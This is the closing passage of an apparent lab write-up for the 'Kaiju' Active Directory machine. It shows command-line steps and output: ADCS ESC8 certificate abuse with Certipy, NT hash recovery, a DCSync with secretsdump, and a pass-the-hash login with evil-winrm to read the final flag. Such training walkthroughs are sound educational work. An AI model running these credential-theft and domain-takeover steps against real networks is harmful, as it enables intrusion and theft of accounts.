<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="n">bersrv105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span><span class="p">:</span><span class="mi">80</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">BERSRV105</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="k">as</span> <span class="n">KAIJU</span><span class="o">/</span><span class="n">BERSRV100</span><span class="n">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Skipping</span> <span class="n">user</span> <span class="n">BERSRV100</span><span class="n">$</span> <span class="n">since</span> <span class="n">attack</span> <span class="n">was</span> <span class="n">already</span> <span class="n">performed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">GOT</span> <span class="n">CERTIFICATE</span><span class="n">!</span> <span class="n">ID</span> <span class="mi">4</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">PKCS</span><span class="n">#12 certificate to ./BERSRV100$.pfx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">successfully</span> <span class="n">written</span> <span class="n">to</span> <span class="n">file</span>
</pre></div>
<p>As you can see, the generated certificate was saved as <code>BERSRV100$.pfx</code>. With this in hand, we can now authenticate against the DC via PKINIT by providing our new certificate with <code>certipy</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">BERSRV100</span>\<span class="n">$</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">domain</span> <span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.221.53</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Certipy</span> <span class="n">v5</span><span class="mf">.0.3</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">identities</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="n">SAN</span> <span class="n">DNS</span> <span class="n">Host</span> <span class="n">Name</span><span class="p">:</span> <span class="s1">'BERSRV100.kaiju.vl'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>     <span class="n">Security</span> <span class="n">Extension</span> <span class="n">SID</span><span class="p">:</span> <span class="s1">'S-1-5-21-1202327606-3023051327-2528451343-1000'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="s1">'bersrv100$@kaiju.vl'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">88</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'bersrv100.ccache'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Wrote</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'bersrv100.ccache'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'bersrv100$'</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">88</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'bersrv100$@kaiju.vl'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">183</span><span class="n">a</span><span class="o">*********************</span><span class="n">ce1b</span>
</pre></div>
<p>We‚Äôve obtained the <code>BERSRV100$</code> machine account‚Äôs NT hash, and you can perform a DCSync by authenticating as <code>BERSRV100$</code> using Pass-the-Hash:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="n">secretsdump</span><span class="o">.</span><span class="n">py</span> <span class="s1">'kaiju.vl/bersrv100$@BERSRV100.kaiju.vl'</span> <span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ntlm</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="o">************</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">config</span> <span class="n">file</span> <span class="n">found</span><span class="p">:</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">proxychains</span><span class="o">.</span><span class="n">conf</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">preloading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libproxychains</span><span class="o">.</span><span class="n">so</span><span class="mf">.4</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">DLL</span> <span class="n">init</span><span class="p">:</span> <span class="n">proxychains</span><span class="o">-</span><span class="n">ng</span> <span class="mf">4.17</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="n">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">445</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">135</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="p">[</span><span class="n">proxychains</span><span class="p">]</span> <span class="n">Strict</span> <span class="n">chain</span>  <span class="o">...</span>  <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">1080</span>  <span class="o">...</span>  <span class="mf">10.10.221.53</span><span class="p">:</span><span class="mi">49668</span>  <span class="o">...</span>  <span class="n">OK</span>
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">0</span><span class="n">b46</span><span class="o">**********************</span><span class="n">f40</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6</span><span class="o">**************</span><span class="mi">0</span><span class="n">c089c0</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="o">********************</span><span class="p">:::</span>
<span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">sasrv200</span><span class="p">:</span><span class="mi">1104</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">0049</span><span class="n">f30</span><span class="o">************</span><span class="n">f5fa</span><span class="p">:::</span>
<span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span>\<span class="n">Rebecca</span><span class="o">.</span><span class="n">Lewis</span><span class="p">:</span><span class="mi">1106</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="o">****************</span><span class="p">:::</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="o">^</span><span class="n">C</span><span class="p">[</span><span class="o">-</span><span class="p">]</span> 
<span class="n">Delete</span> <span class="n">resume</span> <span class="n">session</span> <span class="n">file</span><span class="n">?</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">N</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Cleaning</span> <span class="n">up</span><span class="o">...</span>
</pre></div>
<p>Of course, I canceled the operation since there are 205 users. Now that we have the Administrator NT hash, we can access the DC via <code>WinRM</code> if we want:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">proxychains4</span> <span class="o">-</span><span class="n">q</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="n">bersrv100</span><span class="o">.</span><span class="n">kaiju</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">u</span> <span class="n">administrator</span> <span class="o">-</span><span class="n">H</span> <span class="mi">0</span><span class="n">b46</span><span class="o">**********************</span><span class="n">f40</span>

<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="mf">.7</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span>
</pre></div>
<p>You can also read the last flag, <code>root.txt</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="nb">type</span> <span class="n">root</span><span class="o">.</span><span class="n">txt</span>
<span class="n">VL</span><span class="p">{</span><span class="mi">92</span><span class="o">**************</span><span class="mi">0</span><span class="n">e</span><span class="p">}</span>
<span class="evrm">*Evil-WinRM* PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span>
</pre></div>
<h3>Conclusion</h3><br/>
<p><strong>Kaiju</strong> highlights how seemingly small misconfigurations can be combined into a complete attack path leading to full domain compromise. Starting from an exposed FTP service and weak FileZilla configurations, we escalated through credential reuse, abused group memberships, extracted secrets from KeePass, and finally leveraged an <strong>ADCS ESC8 misconfiguration</strong> to gain control over the domain.</p><br/>
<p>This lab is a great example of how different techniques, lateral movement, tunneling, and certificate abuse can come together in a realistic Active Directory environment.</p><br/>
</p></div>
</div>
</section>
            </main>
        </div>
    </div>
</body>
</html>
